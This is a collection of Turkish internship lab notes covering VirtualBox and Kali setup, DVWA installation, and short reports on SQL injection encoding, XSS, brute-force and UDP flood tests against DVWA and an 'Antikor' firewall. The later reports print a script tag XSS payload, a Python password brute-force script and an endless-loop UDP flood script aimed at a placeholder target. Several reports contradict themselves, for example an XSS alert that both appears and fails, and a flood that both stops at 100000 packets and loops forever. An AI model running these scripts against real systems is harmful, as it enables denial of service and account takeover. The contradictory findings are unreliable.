    Staj 1 Çalışmaları
 VirtualBox Üzerinde Sanal Switch (Host-Only Network) Oluşturma

Bu doküman, Oracle VirtualBox üzerinde sanal switch (host-only network) oluşturmayı adım adım  anlatır. Bu sayede sanal makineler, host makineyle veya kendi aralarında iletişim kurabilir.  

Gereksinimler:

+ Oracle VirtualBox (güncel sürüm)  
+ Yönetici yetkileri		  
+ En az 1 adet sanal makine  

Adımlar:

 A) Host-Only Network Oluşturma
1. VirtualBox’u açın.  
2. Menüden "File > Host Network Manager" seçeneğine gidin.  
3. Sağ alttan "Create" butonuna tıklayın.  
4. Yeni oluşturulan ağın ayarlarını şu şekilde yapabilirsiniz:  
   -> IPv4 Address: '192.168.56.1'  
   -> Subnet Mask: '255.255.255.0'  
   - >(Opsiyonel) "DHCP Server"" → Eğer sanal makinelerin IP’leri otomatik almasını istiyorsanız etkinleştirin.  

 B) Sanal Makineye Ağ Atama
1. VirtualBox ana ekranında sanal makinenizi seçin.  
2. "Settings > Network"sekmesine gidin.  
3. "Adapter 1" için "Attached to" bölümünden "Host-Only Adapter" seçin.  
4. Ağ kartı olarak az önce oluşturduğunuz 'vboxnet0' veya verdiğiniz adı seçin.  
5. Kaydedip çıkın.  

 C) Doğrulama
1. Sanal makineyi başlatın.  
2. Terminal (Linux) veya CMD (Windows) üzerinden IP adresinizi kontrol edin:  
   ip addr    ( Linux)
   ipconfig   (Windows)
3. Host makinenizin IP’sini (ör: '192.168.56.1') ping atarak bağlantıyı test edin: 
   ping 192.168.56.1
   

Notlar:
Host-Only Network, internet erişimi sağlamaz. Yalnızca host ve sanal makineler arasında iletişim kurulur.  
-> İnternet erişimi gerekiyorsa ek olarak  NAT veya  Bridged Adapter kullanabilirsiniz ama ben NAT da hata aldığım için bridge kullandım.


 VirtualBox Üzerine Kali Linux Kurulumu::

Bu doküman, Oracle VirtualBox içinde Kali Linux sanal makinesinin kurulumu ve temel yapılandırmasını adım adım anlatır.  

Gereksinimler:

+Oracle VirtualBox (güncel sürüm)  
+ Kali Linux ISO dosyası (https://www.kali.org/)  
+ En az 4 GB RAM ve 20 GB boş disk alanı  

 Adımlar:

A) Yeni Sanal Makine Oluşturma:
1. VirtualBox’u açın.  
2. New butonuna tıklayın.  
3. Sanal makineye bir isim verin (ör: 'KaliLinux').  
4. Type: "Linux", Version: "Debian (64-bit)" seçin.  
5." Next ile devam edin.  

B) Bellek (RAM) ve Depolama Ayarları:
1. Bellek boyutunu en az 2–4 GB olarak ayarlayın.  
2. "Create a virtual hard disk now" seçeneğini işaretleyin ve "Create" butonuna tıklayın.  
3. Hard disk türü: "VDI"" (VirtualBox Disk Image)  
4. Storage on physical hard disk:"Dynamically allocated" 
5. Disk boyutu: En az 20 GB  

   C) ISO Dosyasını Bağlama:
1. Oluşturduğunuz sanal makineyi seçin ve "Settings > Storage" sekmesine gidin.  
2. "Controller: IDE" altında boş disk simgesine tıklayın.  
3. "Choose a disk file" ile indirdiğiniz Kali Linux ISO dosyasını seçin.  
4. Kaydedin ve çıkın.  

  D) Sanal Makineyi Başlatma:
1. Sanal makineyi seçip  "Start" butonuna tıklayın.  
2. ISO’dan önyükleme başlayacaktır.  
3. Kali Linux kurulum ekranı açılacaktır.  

  E) Kali Linux Kurulumu
1. "Graphical Install" seçeneğini seçin.  
2. Dil ve klavye düzenini seçin.  
3. Ağ yapılandırmasını yapın (hostname, domain name).  
4. Kullanıcı adı ve şifre oluşturun.  
5. Disk bölümleme: "Guided – use entire disk" seçin ve onaylayın.  
6. Kurulum tamamlanınca sistemi yeniden başlatın ve ISO’yu çıkarın. 
7. Dil ayarını değiştirmek isterseniz terminalden setxkbmap tr veya istediğiniz dili girebilirsiniz. 

  F) Doğrulama:
-> Sanal makine açıldığında Kali Linux masaüstü görünmelidir.  
- >Terminali açarak'uname -a' veya 'ifconfig' komutlarıyla sistemi doğrulayabilirsiniz.  

  Notlar:
-> Sanal makine performansı için RAM ve CPU ayarlarını artırabilirsiniz.  
-> İnternet erişimi için  NAT veya Bridged Adapter den birini  tercih edebilirsiniz.  


 SQL Injection ve Karakter KodlamaS Testleri:

Bu doküman, SQL Injection testlerinde karakter kodlamasının (character encoding) etkilerini araştırmak ve farklı payload denemelerini belgelemek amacıyla hazırlanmıştır.  

 Araştırma Adımları:
   A)Karakter Kodlamasının Anlaşılması:
-> İlk olarak karakter kodlamasının ne olduğunu ve SQL Injection saldırılarında karakter kodlamasının nasıl etkili kullanabileceğimi araştırdım.  
- >Karakter kodlaması farklılıklarının veri tabanı sorgularında hatalı veya beklenmedik sonuçlara yol açabileceğini not ettim.  

  B) Sistem Desteklerini Test Etme (Nmap):
  Nmap kullanarak hedef sistemin hangi karakter kodlamalarını desteklediğini araştırmaya çalıştım.  
  Nmap komutu:
  nmap -p 80,443 --script http-charset <hedef_ip_adresi:Private>
  
  -p 80,443 → HTTP ve HTTPS portlarını tarar  
  --script http-charset → Web sunucusunun karakter kodlaması desteğini kontrol eder  
-> Nmap ile yapılan testlerde hedef sistemden anlamlı bir sonuç alınamadı.  

   C) Manuel SQL Injection Payload Denemeleri:
-> Farklı karakter kodlamalarıyla manuel SQL Injection payloadlarını denedim.  
-> Bu denemeler, klasik Latin karakterleri ile standart payloadlar, farklı kodlama formatlarına çevrilmiş payloadlar ve URL encode edilmiş varyasyonları içeriyordu.  
->Sonuç olarak, yine anlamlı bir zafiyet elde edilemedi.  

  D) Unicode ve Normalizasyon Denemeleri:
-> Karakter kodlamasının doğru normalize edilip edilmediğini kontrol etmek için  Unicode karakterleri ile testler yaptım.  
-> Örnek deneme: Kiril ve Latin alfabesindeki 'a' karakteri ile 'admin' giriş denemesi.  
-> Bu yöntemle farklı karakter setlerinin sistem üzerindeki etkilerini inceledim.  

 Denenen Payload Örnekleri:
1. Standart SQL Injection payloadları  
2. Farklı karakter kodlaması ile SQL payloadları  
3. Unicode denemeleri (Latin, Kiril, özel karakterler)  

 Notlar:
->Testler yalnızca izinli ortamlar üzerinde gerçekleştirilmiştir.  
-> Karakter kodlaması, SQL Injection saldırılarının başarılı olup olmamasında kritik bir rol oynayabilir.


  DVWA Kurulumu (Kali Linux)

Bu dökuman, Kali Linux üzerinde  Damn Vulnerable Web Application (DVWA)  uygulamasını adım adım kurmak için hazırlanmıştır. DVWA, web uygulamamasının güvenlik konularını öğrenmek ve test etmek amacıyla kasıtlı olarak zafiyetli olarak tasarlanmış bir PHP/MySQL uygulamasıdır.

> UYARI!!  Bu uygulama sadece eğitim ve test amaçlı  kullanılmalıdır. Asla üretim (production) ortamında veya internete açık bir sunucuda çalıştırılmamalı. Mümkünse sanal makine ve izole ağ kullanın.


  İçindekiler:
1. Gereksinimler
2. Paket Kurulumu
3. DVWA İndirme
4. Veritabanı Kurulumu
5. Konfigürasyon (config.inc.php)
6. Dosya İzinleri
7. Apache / MySQL Servisleri
8. Web Üzerinden Kurulum
9. Güvenlik ve Notlar
10. Hata Çözümleri (Sık karşılaşılan sorunlar)


   1. Gereksinimler:
-> Kali Linux (güncel paket listesi ile)
->  İnternet bağlantısı (paket indirme ve git için)
 >> Grekli paketler:
  ->apache2
  ->mariadb-server  veya  mysql-server
  ->php ve gerekli eklentiler (php-mysqli, php-gd, php-xml vb.)
  -> git (opsiyonel, DVWA reposu için)


   2. Paket Kurulumu
Aşağıdaki komut ile sistem paketlerini güncelleyin ve gerekli paketleri kurun:

sudo apt update && sudo apt upgrade -y
sudo apt install -y apache2 mariadb-server php php-mysqli php-gd php-xml libapache2-mod-php git



   3. DVWA İndirme:
Varsayılan Apache web dizinine (örn: /var/www/html) indirmek için:

cd /var/www/html
sudo git clone https://github.com/digininja/DVWA.git
sudo mv DVWA dvwa

Alternatif olarak repo zip indirip açabilirsiniz.

   4. Veritabanı Kurulumu:
MariaDB servisini başlatın (gerekliyse):

sudo service mysql start

MySQL/MariaDB root hesabıyla giriş yapın:

sudo mysql -u root

Aşağıdaki SQL komutlarını çalıştırarak veritabanı ve kullanıcı oluşturun (örnek olarak 'dvwa' kullanıldı):

sql
CREATE DATABASE dvwa; 
CREATE USER 'dvwa'@'localhost' IDENTIFIED BY 'dvwa';
GRANT ALL PRIVILEGES ON dvwa.* TO 'dvwa'@'localhost';
FLUSH PRIVILEGES;
EXIT;


-> İsterseniz gerçek bir parola ve farklı kullanıcı adı kullanın. Yukarıdaki örnek sadece test/öğrenme içindir.


  5. Konfigürasyon (config.inc.php)
DVWA dizinindeki örnek konfigürasyon dosyasını kopyalayın ve düzenleyin:

cd /var/www/html/dvwa/config
sudo cp config.inc.php.dist config.inc.php
sudo nano config.inc.php

Aşağıdaki alanlardaki veritabanı bilgilerinizi güncelleyin:

php
$_DVWA[ 'db_server' ]   = 'localhost';
$_DVWA[ 'db_user' ]     = 'dvwa';
$_DVWA[ 'db_password' ] = 'dvwa';
$_DVWA[ 'db_database' ] = 'dvwa';
```

Dosyayı kaydedip çıkın.



   6. Dosya İzinleri:
Web sunucusunun DVWA dizinine yazabilmesi gerekir (özellikle "dvwa/hackable/uploads" ve config dizini için):

sudo chown -R www-data:www-data /var/www/html/dvwa
sudo find /var/www/html/dvwa -type d -exec chmod 755 {} \;
sudo find /var/www/html/dvwa -type f -exec chmod 644 {} \;

Eğer belirli dizinler writeable değilse (ör: "external", "hackable/uploads") ek izin verin:

sudo chmod -R 775 /var/www/html/dvwa/external
sudo chmod -R 775 /var/www/html/dvwa/hackable/uploads


   7. Apache / MySQL Servisleri:
Apache ve MariaDB servislerini başlatın ve etkinleştirin:

sudo systemctl start apache2
sudo systemctl enable apache2
sudo systemctl start mysql
sudo systemctl enable mysql

Firewall (ufw) kullanıyorsanız HTTP erişimine izin verin:

sudo ufw allow 80/tcp
sudo ufw allow 443/tcp


  8. Web Üzerinden Kurulum:
Tarayıcınızda aşağıdaki adresi açın (lokalde çalışıyorsanız):

http://127.0.0.1/dvwa/setup.php


Sayfada "Create / Reset Database" butonuna tıklayın. Kurulum başarılı olursa gerekli tablolar oluşturulacaktır.

Giriş bilgileri (varsayılan):

->Kullanıcı adı: 'admin'
-> Şifre: 'password'

Giriş yaptıktan sonra  DVWA Security  seviyesini  low/medium/high şeklinde değiştirerek test edebilirsiniz.



  9. Güvenlik ve Notlar:
-> DVWA kasıtlı olarak zafiyetli bir uygulamadır. İnternete açık bir makinede çalıştırmayın.
-> İzole bir test ortamı (VM) kullanın ve host makineye doğrudan ağ erişimi vermeyin.
-> Kurulum tamamlandıktan sonra gereksiz servisleri kapatın veya ağ kurallarını kısıtlayın.


  10. Hata Çözümleri (Sık karşılaşılan sorunlar)
->500 Internal Server Error: PHP modüllerinin kurulu olduğundan emin olun, Apache hata loglarını kontrol edin (/var/log/apache2/error.log).
->Veritabanı bağlantı hatası: 'config/config.inc.php' içindeki kullanıcı/parola/db adını kontrol edin; MariaDB servisinin çalıştığından emin olun.
-> İzin hataları: www-data sahibi olduğuna ve dizinlerin yazılabilir olduğundan emin olun.


 Ek Kaynaklar:
->Resmi DVWA GitHub: https://github.com/digininja/DVWA
-> Kali Linux belgeleri ve forumları

  BurpSuite ile UTF-8 ve Karakter Kodlaması Testleri::

Bu doküman, BurpSuite kullanarak sistemin karakter kodlaması ve Unicode normalizasyonun davranışlarını test etme adımlarını anlatır.

 Araştırma Adımları:

A) HTTP İsteği Gönderme:

->BurpSuite aracılığıyla sisteme manuel HTTP isteği gönderdim.

->Proxy özelliğini kullanarak HTTP trafiğini izledim.

B) UTF-8 Kullanımını Kontrol Etme:

 ->İncelemeler sırasında Content-Type başlığına baktım:

    application/x-www-form-urlencoded; charset=UTF-8


->Bu satır, sistemin UTF-8 karakter kodlamasını doğru bir şekilde kullandığını gösteriyor.

C) Sonuçlar:

->Antikor güvenlik duvarı, karakter kodlamasını doğru kullanıyor.

->Unicode normalizasyonu düzgün çalışıyor.

->Homoglif saldırılarına karşı koruma sağlanıyor.

->Sonuç olarak, Antikor bu testi başarıyla geçti.

Notlar:
->Testler yalnızca izinli ortamlar üzerinde gerçekleştirilmiştir.

->Karakter kodlaması ve Unicode normalizasyonu, güvenlik duvarlarının homografik ve karakter tabanlı saldırılara karşı direncini anlamak için kritik öneme sahiptir.

  DVWA Üzerinde XSS Testi - Kısa Rapor::

Bu dosya, DVWA (Damn Vulnerable Web Application) üzerinde gerçekleştirilen XSS (Cross-Site Scripting) testine dair kısa bir  rapordur.

> Özet:  DVWA üzerinden antikor demoya XSS saldırısı denendi ve testi  başarıyla geçti (açık gözlenmedi).

   1. Test Ortamı:
->İşletim Sistemi: Kali Linux
-> Hedef Uygulama: DVWA (local / VM içinde)
-> DVWA Security Seviyesi: (varsayılan olarak low/medium/high — Ben medium seviyesinde çalıştım)
-> Tarayıcı: (örn: Firefox / Chrome )

  2. Amaç:
XSS (Cross-Site Scripting) zafiyetinin DVWA içinde hangi sayfada ve hangi koşullarda var olduğunu doğrulamak; saldırının başarıyla gerçekleşip gerçekleşmediğini belgelemektir.

  3. Test Adımları :
Aşağıdaki adımlar test sırasında izlendi (uygulanan tam komut/payload ve sayfa yolu test kayıtlarına göre güncellenmelidir):

1. Tarayıcı ile DVWA uygulamasına giriş yapıldı (Kullanıcı: 'admin', Şifre: 'password').
2. DVWA menüsünden  XSS (Reflected/Stored) modülüne gidildi (örn:xss_r veya xss_s).
3. Giriş alanına aşağıdaki örnek payload girildi ve gönderildi:

html
<script>alert('xss-test');</script>

4. Sayfa yeniden yüklendiğinde veya hedef sayfa ziyaret edildiğinde tarayıcıda `alert('xss-test')` penceresinin göründüğü gözlemlendi.



   4. Kullanılan Payload:
http://url(test etmek istediğin sitenin)/search.php?query=<script>alert('XSS')</script>


   5. Sonuç:
->XSS payloadu başarıllı olmadı; yani uygulama kullanıcı tarafından girilen veriyi yeterli şekilde filtreyebildi ve başarılı oldu.
-> Zafiyet türü: Reflected XSS veya Stored XSS(hangi modülde test yapıldıysa belirtin).

![çıktı](./resimler/xss.jpeg)

   6.Xss saldırısının web sitesi üzerinde etkileri:
-> Kullanıcı oturumlarının çalınması, kötü amaçlı JavaScript çalıştırılması, phishing veya kullanıcı etkileşimlerinin manipülasyonu gibi tehlikeler söz konusu olabilir.
 
   7. Öneriler / Düzeltme (Mitigation):
-> Tüm kullanıcı girdilerini sunucu tarafında uygun şekilde stabilize ve escape edin.
-> HTML context'ine göre doğru escaping fonksiyonlarını kullanın (ör: çıktıyı HTML encode edin).
->HTTP-only ve Secure cookie bayraklarını kullanın.
-> Content Security Policy (CSP) uygulayarak inline script çalıştırılmasını kısıtlayın.
-> Girdi doğrulama (input validation) ve çıktıya uygulanan filtreleri gözden geçirin.



   8. Kayıtlar ve Kanıtlar:
-> Ekran görüntüleri: (alert popup, vulnerable page screenshots)
-> Server / Apache logları: (/var/log/apache2/error.log vs.)


  9. Sonraki Adımlar:
1. Zafiyetin hangi seviyede (low/medium/high) tekrarlandığını test ederek mitigasyonların etkisini kontrol edin.
2. Farklı XSS payload'ları (HTML entity encode, event handler injection, DOM-based XSS testleri) ile genişletilmiş testleri yapın.
3. Eğer bu bir kurumsal rapor ise, CVSS veya benzeri bir etki değerlendirmesi ekleyin ve ilgili geliştiricilere/ekiplere bildirin.


  DVWA Üzerinde Brute-Force Testi - Kısa Rapor:

Bu dosya, DVWA (Damn Vulnerable Web Application) üzerinde gerçekleştirilen brute-force testine dair  bir rapordur.

> Özet: Popüler şifrelerden oluşan bir  wordlist.txt ile hazırlanan Python scripti kullanılarak DVWA içindeki brute-force denemesi gerçekleştirildi. Saldırı başarısız  oldu — yani şifre bulunamadı. 

   1. Test Ortamı:
-> İşletim Sistemi:[ör. Kali Linux 2025.1] 
-> Hedef Uygulama , örn: DVWA vX.Y — repo link veya versiyon
-> DVWA Modülü:  Brute Force - login formu
-> Kullanılan dosyalar:
  -> 'wordlist.txt' wordlist açıklaması 
  -> 'bruteforce.py' [dosya yol/versiyon]
-> Tarayıcı / Araçlar: firebox

  2. Amaç:
Hedef uygulamanın (DVWA) login formuna karşı popüler şifreleri kullanarak brute-force denemeleri yapmak; eğer şifre bulunursa bunu belgelemek, bulunmazsa uygulamanın brute-force dirençliliğini not etmek.

  3. Test Adımları:
1. 'wordlist.txt' dosyası oluşturuldu; içinde yaygın kullanılan şifreler listelendi (her satır için bir şifre olacak şekilde ayarlanmalı).       !
2. 'bruteforce.py' python scripti hazırladım; script wordlist satırlarını teker teker okuyup hedef login formuna POST isteği gönderiyordu. 
3. Hazırlanan 'bruteforce.py' kodu DVWA uygulaması içindeki 'bruteforce.py' dosyasına yazıldı veya sunucuda çalıştırılmalı. 
4. Script çalıştırıldı ve denemeler başladığında başarısızlık çıktıları konsola yönlendirildi. 
5. Test sonucunda: şifre  bulunamadı .

  4. Kullanılan Wordlist ve Script (Örnek)
 Örnek wordlist satırları (`wordlist.txt`):

123456
password
12345678
qwerty
abc123
letmein
...

/var/www/html/dvwa/config/wordlist.txt(wordlist dosya yolu)

python
->Bir dosya oluştur:
nano dvwa_bruteForce.py

import requests


url = url(test etmek istediğin)/login.php"  

username = "admin"

wordlist_path = "/var/www/html/dvwa/config/wordlist.txt"

session = requests.Session()

with open(wordlist_path, "r") as f:
    for password in f:
        password = password.strip()

       
        data = {
            "username": username,
            "password": password
        }

        response = session.post(url, data=data)

        if "Hoşgeldiniz" in response.text or "Welcome" in response.text:
            print(f"[+] Şifre bulundu: {password}")
            break
        else:
            print(f"[-] Denendi: {password}")
çalıştırma-> python3 dvwa_bruteForce.py
   5. Sonuç:
-> 'wordlist.txt' içindeki parolalar ile yapılan brute-force denemeleri başarısız oldu; doğru şifre bulunamadı..  
-> Test amacı (uygulamanın basit/popüler parola listelerine karşı dayanıklılığını kontrol etmek) doğrultusunda sonuç olumludur,uygulama bu testte başarılı görünüyor.


   6. Etki ve Değerlendirmesi:
-> Eğer brute-force başarısız ise güçlü parolalar denenbilir.
-> Eğer brute-force başarılı ise: 
      etkiler: hesap ele geçirme, lateral hareket, önerilen öncelik düzeltme yapılmalıdır.


   7. Öneriler / Düzeltme (Mitigation):
 — >İyi Uygulamalar
-> Hesap kilitleme (ör. belirli başarısız deneme sayısından sonra hesabı geçici kilitleme).  
->Rate limiting (aynı IP’den gelen istekleri sınırlama).  
-> CAPTCHA veya multi-factor authentication (MFA) kullanımı.  
-> Parola politikası (minimum uzunluk, karmaşıklık) ve güçlü parola zorunluluğu.  
-> Login denemelerini ve hatalı denemeleri detaylı loglama ve anomali tespiti.  
-> Credential stuffing’e karşı koruma (ör. bilinen sızıntı parolaları listesi kontrolü).



   9. Sonraki Adımlar:
1. Daha büyük/çeşitli wordlistlerle testleri genişletin (örn. RockYou, SecLists). 
2. Rate-limiting, CAPTCHA ve MFA etkisini test etmek için savunma mekanizmalarını uygulayın ve tekrar deneyin.  
3. Eğer kurumsal bir rapor gerekiyorsa, CVSS skorlaması ve öneri önceliklendirmesi ekleyin. 

   DVWA Üzerinde UDP Flood Testi - Kısa Rapor::

Bu dosya, DVWA (Damn Vulnerable Web Application) veya ilgili test ortamında gerçekleştirilen UDP Flood saldırısı ve antikor (defense) mekanizmasının testinden bahsetmektedir.

> Özet: Python ile yazılan UDP flood scripti kullanılarak terminalden belirli sayıda paket gönderildi. Test, antikor/defense mekanizmasını ölçmek amacıyla yapıldı ve testi başarılı bir şekilde geçti.



  1. Test Ortamı:
-<İşletim Sistemi: Kali Linux  
-> Hedef Sistem: DVWA / test sunucusu IP  
-> Python Versiyonu: 3.x  
->Test Aracı / Script Dosyası: udp_flood.py  
-> Paket Sayısı: 100000

  2. Amaç:
UDP Flood saldırısı ile hedef sistemin antikor / defense mekanizmasının performansını ve dayanıklılığını test etmek.

  3. Test Adımları:
1. udp_flood.py scripti hazırlandı ve hedef IP/port bilgileri script içine yazıldı.  
2. Terminal üzerinden script çalıştırıldı:

python3 udp_flood.py

3. Script ile 100000 UDP paketi hedefe gönderildi.  
4. Sistem logları, terminal çıktısı ve varsa uygulama/defense mekanizması gözlemleri kaydedildi.  
5. Test sonucu başarılı oldu; antikor sistemi paketleri başarıyla karşıladı.


 4. Kullanılan Script :
python
import socket
import random
import time

target_ip = "Test etmek istediğin sitenin url i"
target_port = 80        
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

bytes_data = random._urandom(1024)

print(f"[+] UDP Flood başlatıldı -> {target_ip}:{target_port}")

count = 0
while True:
    sock.sendto(bytes_data, (target_ip, target_port))
    count += 1
    if count % 1000 == 0:
        print(f"[+] {count} paket gönderildi...")
        time.sleep(0.1)

> Not: Script i  izinsiz kullanım etik ve yasal değildir.


   5. Sonuç
-> Gönderilen 100000 UDP paketinin ardından antikor sistemi testi başarıyla geçti.  
-> Sistem paketleri başarıyla karşıladı ve herhangi bir aksaklık yaşanmadı.



  6. Etki ve Değerlendirme
-> Test izole bir ortamda yapılmıştır; gerçek sistemlerde rate-limit, firewall ve IDS/IPS gibi mekanizmalar farklı davranabilir.  
-> Testin amacı saldırının başarısını değil, antikor/defense mekanizmasının doğru çalışıp çalışmadığını gözlemlemektir.


 7. Öneriler / İyileştirme
-> Eğer test başarısız olmuş olsaydı, firewall/antikor sisteminin paket filtreleme ve rate-limit ayarları gözden geçirilmeli.  
-> Üretim ortamında ek logging ve uyarı mekanizmaları eklenmeli.  
-> DDoS saldırı simülasyonları için özel test ortamı kullanılmalı.


 9. Sonraki Adımlar
1. Farklı paket boyutları ve hızları ile testler yapılabilir.  
2. Defense mekanizmasının yük altındaki performansı izlenebilir.  
3. Daha sofistike UDP / TCP flood senaryoları hazırlanabilir ve test edilmeden önce izinli ortamda yapılmalıdır.